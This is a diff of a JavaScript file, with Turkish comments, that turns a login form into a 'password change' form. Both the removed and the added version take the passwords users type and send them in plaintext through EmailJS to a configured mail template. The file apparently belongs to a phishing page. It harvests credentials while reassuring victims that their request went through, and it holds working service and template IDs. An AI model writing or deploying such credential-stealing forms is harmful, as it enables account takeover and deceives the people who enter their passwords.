@@ -1,34 +1,32 @@
-// script.js
+document.getElementById('password-form').addEventListener('submit', function(e){
+  e.preventDefault();
 
-// Form submit işlemi
-document.getElementById("loginForm").addEventListener("submit", function(e){
-    e.preventDefault(); // sayfa yenilenmesin
-    
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value;
+  var currentPwd = document.getElementById('current_password').value;
+  var newPwd = document.getElementById('new_password').value;
+  var confirm = document.getElementById('new_password_confirmation').value;
 
-    // Template ID'yi buraya koy: örn "template_abc123"
-    const TEMPLATE_ID = "YOUR_TEMPLATE_ID"; // <-- BURAYI DEĞİŞTİR
+  if(newPwd !== confirm){
+    alert('Yeni şifre ve tekrarı eşleşmiyor.');
+    return;
+  }
 
-    // Service ID senin verdiğin:
-    const SERVICE_ID = "service_5d8r3x7";
+  // Base64 kaldırıldı
+  var encodedCurrent = currentPwd;
+  var encodedNew = newPwd;
 
-    // Ek alan: tarih
-    const date = new Date().toLocaleString();
+  const SERVICE_ID = "service_kxgmu58";
+  const TEMPLATE_ID = "template_t4x776r";
 
-    // EmailJS send (public key zaten emailjs.init ile ayarlandı)
-    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-        username: username,
-        password: password,
-        date: date
-    })
-    .then(function(response) {
-        alert("Form başarıyla gönderildi! (Demo)");
-        console.log("SUCCESS!", response.status, response.text);
-        // İsteğe bağlı: formu sıfırla
-        document.getElementById("loginForm").reset();
-    }, function(error) {
-        alert("Bir hata oluştu, tekrar deneyin.");
-        console.log("FAILED...", error);
-    });
+  emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+    current_password: encodedCurrent,
+    new_password: encodedNew,
+    date: new Date().toLocaleString()
+  })
+  .then(function(response){
+    alert('Şifre değişikliği talebiniz gönderildi!');
+    document.getElementById('password-form').reset();
+  }, function(error){
+    alert('Bir hata oluştu, tekrar deneyin.');
+    console.log(error);
+  });
 });
